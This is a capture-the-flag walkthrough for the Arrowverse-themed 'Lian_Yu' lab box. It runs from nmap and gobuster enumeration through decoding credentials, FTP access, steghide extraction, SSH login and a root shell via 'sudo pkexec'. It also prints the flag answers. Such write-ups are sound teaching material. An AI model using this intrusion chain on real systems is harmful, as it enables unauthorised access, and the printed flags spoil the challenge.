# Lian_Yu

## Description

A beginner level security challenge

## [Task 1] Find the Flags

Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.

### Q1 - Deploy the VM and Start the Enumeration.

Let's start with an Nmap scan:

~~~
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          51386/udp6  status
|   100024  1          55188/tcp6  status
|   100024  1          56439/tcp   status
|_  100024  1          60720/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

The scan reveals four open ports:
* 21 ftp
* 22 ssh
* 80 http
* 111 rpcbind

Let's start with the web service. The first thing I did was running `gobuster` on it:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP/ 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.104/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/02 10:57:00 Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 236] [--> http://10.10.204.104/island/]
~~~

We found `/island`. Let's see the content:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ curl -s "http://$IP/island/" | html2text 
****** Ohhh Noo, Don't Talk............... ******
I wasn't Expecting You at this Moment. I will meet you there
You should find a way to Lian_Yu as we are planed. The Code Word is:
***** vigilante *****
~~~

There is a hidden code: `vigilante`. It might be useful later.

### Q2 - What is the Web Directory you found?

I ran gonuster again on `/island` to see if we can find anything else:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP/island/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.104/island/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/02 11:00:31 Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 241] [--> http://10.10.204.104/island/2100/]
~~~

We found `/island/2100`:

~~~html
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ curl -s "http://$IP/island/2100/"
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
~~~

Found: `2100`

### Q3 - what is the file name you found?

There is a comment in `/2100` which is probably refering to a file with `.ticket` extention. I ran `gobuster` again with `-x ticket` which adds the extention to the words:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP/island/2100/ -x ticket
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.104/island/2100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
2021/11/02 11:10:19 Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
~~~

File name: `green_arrow.ticket`

### Q4 - what is the FTP Password?

Let's see what the ticket is:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Lian_Yu]
└─$ curl -s "http://$IP/island/2100/green_arrow.ticket"

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX

~~~

We are given an encoded string. It is base58 encoded. I decoded it using [CyberChef](https://gchq.github.io/CyberChef/). It seems like a password.

FTP password: `!#th3h00d`

### Q5 - what is the file name with SSH password?

I logged into the FTP service using the "code" we found and the password we just found: `vigilante:!#th3h00d`

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ ftp $IP
Connected to 10.10.204.104.
220 (vsFTPd 3.0.2)
Name (10.10.204.104:user): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> pwd
257 "/home/vigilante"
~~~

As you can see, we are in user `vigilante`'s home directory. There is a file named `.other_user`. Let's downlaod it and read it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ cat .other_user  
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare.

[REDACTED]
~~~

It is a long text but we see a lot of use of the name `slade`. It might be a username, so let's keep it for now.

I downloaded the images to see if I can find anything in them:

~~~
ftp> mget *
mget Leave_me_alone.png? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 0.92 secs (543.6082 kB/s)
mget Queen's_Gambit.png? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 1.63 secs (328.6385 kB/s)
mget aa.jpg? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.56 secs (332.1301 kB/s)
~~~

After taking a look at the files, it seems like that `Leave_me_alone.png` is corrupted. I took a look at its magic numbers and they don't match to a png file:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ xxd Leave_me_alone.png | head -n1
00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
~~~

Let's fix them. Change the first eight values to `89 50 4E 47 0D 0A 1A 0A`. I used `hexeditor`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ xxd Leave_me_alone.png | head -n1
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
~~~

Now it's fixed. Let's take a look at it:

<p align="center"><img src="./files/Leave_me_alone.png"></p>

The picture says the password is `password`. I used `steghide` on the `aa.jpg` file and used `password` as the passphrase and extracted a zip file named `ss.zip`. Let's extract it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ unzip ss.zip                      
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado
~~~

It extracted into two files: `passwd.txt` and `shado`. Let's see read them:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.


┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ cat shado 
M3tahuman
~~~

The first one is a note and the second one contains the password for SSH which is `M3tahuman`.

Answer: `shado`

### Q6 - user.txt

Now we can use the password to connect via SSH. The password is valid for user `slade` which we found in the ftp files:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Lian_Yu/files]
└─$ ssh slade@$IP              
slade@10.10.204.104's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$
~~~

We can find the user flag in our home directory:

~~~
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

~~~

user.txt: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

### Q7 - root.txt

Now we need to gain root access in order to obtain the root flag, so I ran `sudo -l` to check my sudo permissions:

~~~
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
~~~

As you can see, we can run `pkexec` with sudo and no password. This command let's us execute commands as another user. If we run it with sudo, we can run commands as root, so we can easily spawn a bash shell as root:

~~~
slade@LianYu:~$ sudo /usr/bin/pkexec -u root /bin/bash
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Now we can read the root flag:

~~~
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt 
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

~~~

root.txt: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )